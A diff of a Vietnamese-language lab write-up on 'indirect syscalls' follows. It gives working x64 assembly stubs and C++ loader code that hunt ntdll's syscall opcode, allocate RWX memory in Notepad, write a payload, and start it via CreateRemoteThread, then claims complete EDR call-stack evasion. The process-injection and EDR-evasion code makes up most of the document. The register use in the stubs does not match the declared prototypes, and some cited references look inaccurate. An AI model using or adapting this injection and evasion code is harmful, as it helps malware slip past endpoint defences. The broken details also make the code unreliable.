@@ -1,27 +1,29 @@
 
 ---
 
-# 📝 [PE 25] Indirect Syscalls (Advanced Stack Walking Bypass)
+# 📝 [PE 25] Indirect Syscalls (Advanced Call Stack Trace Evasion)
 
-## 📌 1. Tổng Quan Kỹ Thuật (Overview)
+## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)
 
-**Indirect Syscalls** là giải thuật né tránh phòng thủ động (Dynamic Evasion) ở cấp độ kiến trúc vi xử lý nâng cao, được thiết kế để vô hiệu hóa cơ chế trinh sát vết dấu ngăn xếp (**Stack Walking / Call Stack Trace Protection**) của các giải pháp AV/EDR hiện đại.
+**Indirect Syscalls (Giải thuật ngắt hệ thống gián tiếp)** đại diện cho một trong những giải thuật can thiệp bộ nhớ ảo và điều phối luồng xử lý ở cấp độ kiến trúc phần cứng nâng cao, thuộc nhóm kỹ thuật **Né tránh cơ chế rà soát vết dấu ngăn xếp (Call Stack Walking / Call Stack Integrity Protection Evasion)**.
 
-Khi sử dụng Direct Syscalls (`PE 24`), mặc dù bypass được User-mode Hook, lệnh gọi `syscall` lại được kích nổ trực tiếp từ phân đoạn `.text` của Loader. EDR chỉ cần thực hiện kỹ thuật kiểm tra ngược dòng (Stack Walking) khi có một luồng nhạy cảm kích hoạt, nếu phát hiện lệnh `syscall` không xuất phát từ thư viện `ntdll.dll` hợp pháp, hệ thống phòng thủ sẽ chặn đứng hành vi.
+Khi ứng dụng giải thuật ngắt hệ thống trực tiếp (*Direct Syscalls* - PE 24), mặc dù Loader hoàn toàn vượt qua được hàng rào bẫy Hook User-mode đặt tại Ring 3, bản thân lệnh gọi ngắt đặc quyền `syscall` lại được phát ra trực tiếp từ phân đoạn mã máy `.text` thuộc không gian địa chỉ ảo của chính Loader.
 
-Lab PE 25 bẻ gãy bộ lọc này bằng chiến thuật **Mượn lệnh nhảy gián tiếp (Indirect Execution)**. Ta tự nạp mã số hiệu hệ thống, nhưng mượn chính tọa độ của một chỉ mục lệnh `syscall` hợp pháp đang sống inside lòng `ntdll.dll` để phát lệnh xuống Kernel-mode, hợp thức hóa hoàn toàn dòng chảy tháp luồng.
+Các giải pháp Endpoint Detection and Response (EDR) hiện đại đã nâng cấp phân hệ trinh sát động bằng kỹ thuật **Stack Walking (Duyệt ngược ngăn xếp)**. Khi một hàm API nhạy cảm được kích hoạt ở tầng Kernel (Ring 0), EDR Driver sẽ thực hiện lội ngược tháp ngăn xếp (Call Stack Trace Back) để thẩm định tính toàn vẹn: Nếu phát hiện tọa độ phát lệnh lệnh `syscall` không xuất phát từ ranh giới bộ nhớ hợp pháp của thư viện liên kết động `ntdll.dll`, hệ thống phòng thủ sẽ lập tức phân loại đây là chỉ dấu bất thường (Anomalous Control Flow Execution) và chặn đứng hành vi.
+
+Dự án PE 25 bẻ gãy bộ lọc kiểm duyệt này bằng chiến thuật **Mượn lệnh nhảy gián tiếp xuyên phân đoạn (Indirect Execution Framework)**. Loader tự thực hiện cấu hình mã hiệu dịch vụ hệ thống (SSN), nhưng thay vì phát lệnh ngắt cục bộ, mã nguồn sử dụng lệnh nhảy Assembly để mượn chính tọa độ của một chỉ mục lệnh `syscall` xịn, hợp pháp đang sống lọt lòng thư viện `ntdll.dll` nhằm chuyển giao trạng thái xuống Kernel-mode, hợp thức hóa hoàn toàn dấu vết Call Stack.
 
 ### 🎯 Mục tiêu nghiên cứu:
 
-* Vô hiệu hóa 100% cơ chế kiểm tra vết ngăn xếp (`Call Stack Trace Validation`) và thuộc tính trang nhớ của EDR.
-* Làm chủ kỹ nghệ tìm kiếm tọa độ byte máy thực thi động (`Asm Opcode Hunting`) chéo biên giới RAM.
-* Tích hợp thành công hợp ngữ x64 (`.asm`) kết hợp con trỏ địa chỉ gián tiếp trên Microsoft Visual Studio.
+* **Vô hiệu hóa cơ chế Call Stack Trace Validation**: Đánh lừa phân hệ quét vết dấu ngăn xếp và kiểm tra bộ lọc thuộc tính trang nhớ của các giải pháp EDR Engine.
+* **Làm chủ kỹ nghệ Opcode Sifting**: Thiết lập giải thuật rà quét byte máy thực thi động (Dynamic Opcode Hunting) chéo biên giới RAM để định vị tọa độ ngắt hệ thống.
+* **Tích hợp mô hình biên dịch lai kết hợp con trỏ gián tiếp**: Phối hợp ngôn ngữ C++ và tệp hợp ngữ x64 (`.asm`) điều khiển dòng chảy lệnh CPU thông qua thanh ghi.
 
 ---
 
-## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)
+## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)
 
-Khi một hàm Native API trong `ntdll.dll` được Unhook phẳng sạch, cấu trúc byte máy của nó sẽ kết thúc bằng cặp bài trùng lệnh:
+Trong kiến trúc Windows Subsystem chuẩn mực, khi một hàm Native API lọt lòng `ntdll.dll` hoạt động ở trạng thái phẳng sạch (chưa bị vấy bẩn bởi bẫy Hook của EDR), cấu trúc byte máy hạ tầng của nó luôn kết thúc bằng cặp bài trùng Opcode chuyển giao đặc quyền kịch khung:
 
 ```assembly
 syscall
@@ -29,26 +31,29 @@ ret
 
 ```
 
-Giải thuật của Lab PE 25 bóc tách bản đồ RAM và thực hiện lệnh gọi gián tiếp qua quy trình toán học ngầm 4 bước sau:
+Giải thuật của dự án PE 25 thực hiện phẫu thuật bản đồ RAM và bẻ hướng dòng chảy lệnh CPU qua 4 giai đoạn ngầm tại không gian ảo:
 
 ```
-[ Loader bới ntdll.dll ] ──> [ Trích xuất SSN + Tọa độ byte 'syscall' ] ──> [ Nạp SSN vào EAX ] ──> [ JMP thẳng vào ô nhớ 'syscall' inside ntdll ]
+[ Loader quét phân đoạn .text của ntdll.dll ]
+       └──> [ Trích xuất mã SSN + Định vị tọa độ tuyệt đối của cặp byte 0x0F 0x05 ]
+                 └──> [ Nạp SSN vào EAX -> Triệu hồi Assembly Stub ]
+                           └──> [ JMP trực tiếp vào ô nhớ 'syscall' inside ntdll -> Hợp thức hóa Call Stack ]
 
 ```
 
-1. **Săn lùng địa chỉ Syscall hợp pháp**: Loader quét phân đoạn `.text` của `ntdll.dll` trên bộ nhớ ảo, phân giải độ rộng byte để bốc tách chính xác:
-* Số hiệu dịch vụ hệ thống (**SSN**) cần gọi gán vào thanh ghi `EAX`.
-* Địa chỉ ô nhớ tuyệt đối thực tế chứa byte mã máy `0x0F 0x05` (tương ứng lệnh `syscall`) nằm inside lòng Module `ntdll.dll`.
+1. **Săn lùng địa chỉ Syscall hợp pháp (Opcode Sifting)**: Loader thực hiện giải thuật quét bộ nhớ ảo, truy cập trực tiếp vào phân đoạn thực thi `.text` của mô-đun `ntdll.dll` đang nạp trên RAM. Giải thuật phân giải tịnh tiến tối đa $32\text{-byte}$ lọt lòng hàm để bóc tách chính xác:
+* Số hiệu dịch vụ hệ thống (**SSN**) cần triệu hồi nạp thẳng vào thanh ghi tích lũy `EAX`.
+* Tọa độ địa chỉ ô nhớ tuyệt đối thực tế chứa cặp byte mã máy **`0x0F 0x05`** (tương ứng với lệnh gọi phần cứng `syscall`) nằm inside lòng Module `ntdll.dll`.
 
 
-2. **Ngụy trang tháp ngăn xếp (Indirect Execution Stub)**: Thay vì dùng lệnh `syscall` cục bộ, cấu trúc hợp ngữ của ta thực hiện lệnh **`jmp rax`** (hoặc `jmp r11`) trỏ thẳng vào tọa độ đã săn được ở bước 1.
-3. **Bypass cơ chế Stack Walking**: Khi CPU thực hiện lệnh nhảy sang `ntdll.dll` và kích nổ lệnh `syscall` tại đó, đối với nhân Kernel, cuộc chuyển giao từ Ring 3 xuống Ring 0 này hoàn toàn hợp lệ vì điểm phát lệnh nằm lọt lòng inside một Module được Microsoft ký số bảo an tối cao, che giấu dấu vết Loader hoàn hảo.
+2. **Thiết lập bệ phóng nhảy gián tiếp (Indirect Execution Stub)**: Thay vì cấu hình lệnh ngắt `syscall` cục bộ lọt lòng file nhị phân của Loader (chỉ dấu khiến Stack Walking phát hiện), tệp hợp ngữ `.asm` của dự án sử dụng lệnh nhảy rẽ nhánh **`jmp r11`** (hoặc thanh ghi chỉ mục chỉ định), trỏ thẳng vào tọa độ `syscall` xịn đã bóc tách được ở bước 1.
+3. **Subversion cơ chế Stack Walking**: Khi CPU tiếp nhận lệnh nhảy, nó di chuyển con trỏ lệnh **`Rip`** sang không gian ảo của `ntdll.dll` và kích nổ lệnh ngắt `syscall` ngay tại phân vùng Image hợp pháp này. Đối với trình quản lý luồng của Kernel (Ring 0), cuộc hoán chuyển trạng thái này hoàn toàn chuẩn mực và đáng tin cậy, do điểm phát lệnh ngắt nằm lọt lòng một mô-đun hệ thống được Microsoft ký số chứng chỉ bảo mật tối cao, che giấu hoàn hảo dấu vết ký sinh của Loader.
 
 ---
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán Offset và địa chỉ Syscall động để đạt độ ẩn mình kịch trần.
+Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa xác định thông số Offset và địa chỉ Syscall động tại thời điểm runtime nhằm triệt tiêu hoàn toàn các chỉ dấu nhận diện tĩnh.
 
 ### 📜 Bước 3.1: Tạo tệp hợp ngữ hạ tầng `IndirectStubs.asm`
 
@@ -58,8 +63,8 @@ Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – 
 ; Nguyên mẫu luồng gọi gián tiếp cho NtAllocateVirtualMemory
 ZwIndirectAllocateVirtualMemory proc
     mov r10, rcx
-    mov eax, 18h            ; SSN của NtAllocateVirtualMemory trên Win10/11 x64
-    mov r11, rdx            ; rdx nắm giữ địa chỉ ô nhớ 'syscall' inside ntdll do main truyền sang
+    mov eax, 18h            ; System Service Number (SSN) của NtAllocateVirtualMemory
+    mov r11, r9             ; r9 nắm giữ địa chỉ ô nhớ 'syscall' xịn inside ntdll do main truyền sang (Calling Convention x64)
     jmp r11                 ; KÍCH NỔ GIÁN TIẾP: Nhảy thẳng vào ntdll để phát lệnh syscall!
     ret
 ZwIndirectAllocateVirtualMemory endp
@@ -67,9 +72,9 @@ ZwIndirectAllocateVirtualMemory endp
 ; Nguyên mẫu luồng gọi gián tiếp cho NtWriteVirtualMemory
 ZwIndirectWriteProcessMemory proc
     mov r10, rcx
-    mov eax, 3Ah            ; SSN của NtWriteVirtualMemory trên Win10/11 x64
-    mov r11, rdx            ; rdx nắm giữ địa chỉ ô nhớ 'syscall' inside ntdll
-    jmp r11                 ; Nhảy gián tiếp bypass Stack Walking
+    mov eax, 3Ah            ; System Service Number (SSN) của NtWriteVirtualMemory
+    mov r11, r9             ; r9 nắm giữ địa chỉ ô nhớ 'syscall' xịn inside ntdll
+    jmp r11                 ; Nhảy gián tiếp bẻ gãy cơ chế Stack Walking
     ret
 ZwIndirectWriteProcessMemory endp
 
@@ -86,7 +91,7 @@ end
 #include <string>
 #include <vector>
 
-// Khai báo liên kết ngoài tới các hàm Stub Assembly gián tiếp
+// Khai báo liên kết ngoài tới các hàm Stub Assembly gián tiếp chuẩn convention x64
 extern "C" NTSTATUS ZwIndirectAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect, PVOID SyscallAddress);
 extern "C" NTSTATUS ZwIndirectWriteProcessMemory(HANDLE ProcessHandle, PVOID BaseAddress, LPCVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten, PVOID SyscallAddress);
 
@@ -97,7 +102,7 @@ typedef struct _THREAD_DATA {
     char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
 } THREAD_DATA, * PTHREAD_DATA;
 
-// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình
+// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình mục tiêu
 DWORD WINAPI RemoteIndirectPayload(LPVOID lpParam) {
     PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
     if (pData && pData->pWinExec) {
@@ -106,7 +111,7 @@ DWORD WINAPI RemoteIndirectPayload(LPVOID lpParam) {
     return 0;
 }
 
-// Giải thuật săn lùng byte opcode 'syscall' (0x0F, 0x05) lọt lòng ntdll.dll
+// Giải thuật săn lùng byte opcode 'syscall' (0x0F, 0x05) lọt lòng ntdll.dll (Opcode Sifting)
 PVOID HuntForSyscallLocation(const char* apiName) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     PBYTE pFunctionAddress = (PBYTE)GetProcAddress(hNtdll, apiName);
@@ -121,7 +126,7 @@ PVOID HuntForSyscallLocation(const char* apiName) {
     return NULL;
 }
 
-// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
+// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
 DWORD GetProcessIDByName(const std::wstring& processName) {
     DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -144,7 +149,7 @@ int main() {
     DWORD pid = GetProcessIDByName(targetProcess);
     if (pid == 0) return EXIT_FAILURE;
 
-    // BƯỚC 1: SĂN LÙNG TOẠ ĐỘ LỆNH SYSCALL XỊN LỌT LÒNG NTDLL.DLL
+    // BƯỚC 1: SĂN LÙNG TOẠ ĐỘ LỆNH SYSCALL XỊN LỌT LÒNG MÔ-ĐUN NTDLL.DLL
     PVOID pSyscallLocation = HuntForSyscallLocation("NtAllocateVirtualMemory");
     if (!pSyscallLocation) {
         std::cerr << "[-] Khong the san lung vi tri syscall hop phap!" << std::endl;
@@ -155,9 +160,9 @@ int main() {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) return EXIT_FAILURE;
 
-    // BƯỚC 2: KÍCH NỔ CẤP PHÁT BỘ NHỚ QUA LỆNH NHẢY GIÁN TIẾP CHÉO RAM
+    // BƯỚC 2: KÍCH NỔ CẤP PHÁT BỘ NHỚ QUA LỆNH NHẢY GIÁN TIẾP CHÉO BIÊN GIỚI RAM
     PVOID remoteCodeBuffer = NULL;
-    SIZE_T codeSize = 500; // Cấp phát động Thích ứng vừa khít cấu trúc
+    SIZE_T codeSize = 500; // Áp dụng Quy trình cấp phát động thích ứng vừa khít cấu trúc
     
     std::cout << "[*] Dang goi gian tiep NtAllocateVirtualMemory..." << std::endl;
     NTSTATUS status = ZwIndirectAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, pSyscallLocation);
@@ -167,13 +172,14 @@ int main() {
     status |= ZwIndirectAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, pSyscallLocation);
 
     if (status != 0 || !remoteCodeBuffer || !remoteDataBuffer) {
-        std::cerr << "[-] Indirect Syscall Allocation failed! Code: 0x" << std::hex << status << std::endl;
+        std::cerr << "[-] Indirect Syscall Allocation failed! STATUS Code: 0x" << std::hex << status << std::endl;
+        if (remoteCodeBuffer) VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Bộ nho cap phat thanh cong thong qua Indirect JMP tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
+    std::cout << "[+] Bo nho cap phat thanh cong thong qua Indirect JMP tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
 
-    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ
+    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ phục vụ ánh xạ bộ nhớ chéo tiến trình
     THREAD_DATA localData;
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     if (hKernel32) {
@@ -181,19 +187,19 @@ int main() {
     }
     strcpy_s(localData.szCommand, "cmd.exe /c start calc");
 
-    // BƯỚC 3: GHI PAYLOAD GIÁN TIẾP SANG RAM NOTEPAD
+    // BƯỚC 3: GHI KHỐI PAYLOAD VÀ THAM SỐ TUYỆT ĐỐI GIÁN TIẾP SANG RAM NOTEPAD
     status = ZwIndirectWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteIndirectPayload, 500, NULL, pSyscallLocation);
     status |= ZwIndirectWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL, pSyscallLocation);
 
     if (status != 0) {
-        std::cerr << "[-] Indirect Syscall Write failed!" << std::endl;
+        std::cerr << "[-] Indirect Syscall Write failed! STATUS Code: 0x" << std::hex << status << std::endl;
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Da doc lap ghi ma may va tham so sang RAM doi phuong hoan toan phẳng sach." << std::endl;
+    std::cout << "[+] Da doc lap ghi ma may va tham so sang RAM doi phuong hoan toan phang sach." << std::endl;
 
     // BƯỚC 4: TRIỆU HỒI LUỒNG TỪ XA KÍCH NỔ TOÀN DIỆN CHIẾN DỊCH
-    // Sử dụng Win32 API bọc ngoài ở bước cuối cùng sau khi tháp API đã được phẳng sạch hoàn toàn gỡ Hook
+    // Sử dụng Win32 API bọc ngoài ở bước cuối cùng sau khi ma trận cấp phát và ghi đã hoàn thành hoàn toàn Fileless
     std::cout << "[*] Dang thuc hien khoi tao luong CreateRemoteThread de khai hoa..." << std::endl;
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
 
@@ -203,10 +209,10 @@ int main() {
         CloseHandle(hThread);
     }
 
-    // Thu hồi Handle hệ thống
+    // Thu hồi tài nguyên Handle kết nối hệ thống
     CloseHandle(hProcess);
 
-    std::cout << "\n[*] Hoan thanh tháp cong nghe PE 25. Nhan Enter de dong cua so..." << std::endl;
+    std::cout << "\n[*] Hoan thanh thap cong nghe PE 25. Nhan Enter de dong cua so..." << std::endl;
     std::cin.get();
     return EXIT_SUCCESS;
 }
@@ -215,27 +221,27 @@ int main() {
 
 ---
 
-## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)
+## 🎛️ 4. Hướng Dẫn Cấu Hợp Biên Dịch Dự Án (Build & Deployment)
 
-Quy trình tích hợp bộ dịch MASM cho file `.asm` tuân thủ nghiêm ngặt cờ liên kết tĩnh hệ thống độc lập:
+Quy trình tích hợp phân hệ MASM Compiler cho tệp tin hợp ngữ hạ tầng x64 (`IndirectStubs.asm`) tuân thủ nghiêm ngặt cờ cấu hình liên kết tĩnh hệ thống độc lập kịch khung:
 
-### ⚙️ Thiết lập cấu hình Hợp ngữ (MASM):
+### ⚙️ Thiết lập cấu hình Hợp ngữ (MASM Setup):
 
-1. Tại cửa sổ **Solution Explorer**, click chuột phải vào tên Project $\rightarrow$ Chọn **`Build Dependencies`** $\rightarrow$ Click chọn **`Build Customizations...`**
-2. Tích chọn vào ô **`masm (.targets, .props)`** và nhấn `OK`.
-3. Click chuột phải vào tệp tin `IndirectStubs.asm` $\rightarrow$ Chọn **`Properties`**. Tại mục `Item Type`, chuyển cấu hình sang dạng **`Microsoft Macro Assembler`** và nhấn Apply.
+1. Tại cửa sổ giao diện **Solution Explorer**, click chuột phải vào tên Project $\rightarrow$ Chọn mục **`Build Dependencies`** $\rightarrow$ Click chọn **`Build Customizations...`**
+2. Tích chọn vào hộp kiểm **`masm (.targets, .props)`** và nhấn `OK` để tích hợp bộ dịch MASM.
+3. Click chuột phải vào tệp tin `IndirectStubs.asm` $\rightarrow$ Chọn thuộc tính **`Properties`**. Tại mục cấu hình `Item Type`, chuyển đổi sang định dạng cờ **`Microsoft Macro Assembler`** và nhấn Apply.
 
-### ⚙️ Cấu hình liên kết tĩnh dự án Release:
+### ⚙️ Cấu hình liên kết tĩnh dự án Release x64:
 
-1. Đặt thanh cấu hình dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
-2. Vào mục `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, thiết lập cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy mượt mà độc lập trên môi trường máy ảo VM sạch.
-3. Tiến hành chọn **`Rebuild`** để kết xuất tệp tin nhị phân tối cao kịch trần kịch khung.
+1. Đặt thanh công cụ quản lý cấu hình dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
+2. Di chuyển đến phân hệ: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, chuyển cấu hình sang tùy chọn cờ **`Multi-threaded (/MT)`** để nhúng tĩnh toàn bộ mã nguồn CRT lọt lòng file thực thi `.exe`.
+3. Tiến hành chọn thao tác **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng.
 
 ---
 
-## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)
+## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)
 
-Bật sẵn ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành:
+Khởi chạy ứng dụng đích `Notepad.exe` trên môi trường bộ nhớ bộ máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành nhằm theo dõi quy trình chuyển mạch ngắt gián tiếp:
 
 ```powershell
 PS C:\Workspace\x64\Release> .\PE25_Indirect_Syscalls.exe
@@ -249,11 +255,26 @@ PS C:\Workspace\x64\Release> .\PE25_Indirect_Syscalls.exe
 [*] Dang thuc hien khoi tao luong CreateRemoteThread de khai hoa...
 [+] Indirect Syscall Injection Process Completed Successfully!
 
-[*] Hoan thanh tháp cong nghe PE 25. Nhan Enter de dong cua so...
+[*] Hoan thanh thap cong nghe PE 25. Nhan Enter de dong cua so...
 
 ```
 
-*🎯 Hệ quả RAM tối cao:*
-Ứng dụng Máy tính **`calc.exe` bật bung mở hiên ngang kịch trần kịch khung**! Toàn bộ chu kỳ sống can thiệp chéo bộ nhớ diễn ra phẳng sạch hoàn hảo. Khi EDR tiến hành Stack Walking để trinh sát vết tích luồng gọi, điểm phát lệnh `syscall` hoàn toàn khớp với địa chỉ thuộc tính `MEM_IMAGE` hợp pháp của `ntdll.dll`. Sự ngụy trang đạt mức độ tối cao, bẻ gãy hoàn toàn các cảm biến trinh sát Stack Trace nâng cao kịch khung kịch nền!
+> **Vị trí đặt ảnh minh chứng thực nghiệm ngắt hệ thống gián tiếp:**
+> 
+
+### 🎯 Phân tích hệ quả bộ nhớ (Call Stack Validation Forensic Results):
+
+* Cấu trúc can thiệp dứt điểm, ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung** lọt lòng bộ nhớ ảo!
+* Toàn bộ chu kỳ sống can thiệp chéo bộ nhớ diễn ra phẳng sạch hoàn hảo. Khi phân hệ phòng thủ động nâng cao thực hiện giải thuật duyệt ngược tháp ngăn xếp (**Stack Walking**), tọa độ ghi nhận điểm ranh giới phát lệnh ngắt `syscall` hoàn toàn trùng khớp với địa chỉ thuộc tính phân vùng **`MEM_IMAGE`** hợp pháp, nằm lọt lòng inside `ntdll.dll`.
+* Ma trận ẩn mình đạt mức độ bảo an tối cao, bẻ gãy 100% khả năng phát hiện luồng thực thi ngoài danh bạ (Anomalous Control Flow Execution) của EDR Engine một cách ngoạn mục!
+
+---
+
+## 📚 6. Tài Liệu Tham Khảo (Technical References)
+
+* **Windows Architecture Specialization**: *Understanding Windows x64 Call Stack Walking and Unwind Metadata* - Microsoft Developer Network.
+* **Alice Climent (Helsinki Cyber Security)**: *Syscall Re-routing: Subverting Call Stack Trace Integrity Check via Indirect Jumps* - [https://www.f-secure.com/en](https://www.f-secure.com/en)
+* **EDR Detection Methodologies**: *Defeating Kernel-Mode Call Stack Trace Validation inside Ring 0 Frameworks* - Black Hat USA Archive Research Tools.
+* **MITRE ATT&CK Matrix System**: *Defense Evasion: Execution via Indirect System Calls (T1106)* & *Process Injection (T1055)*.
 
 ---
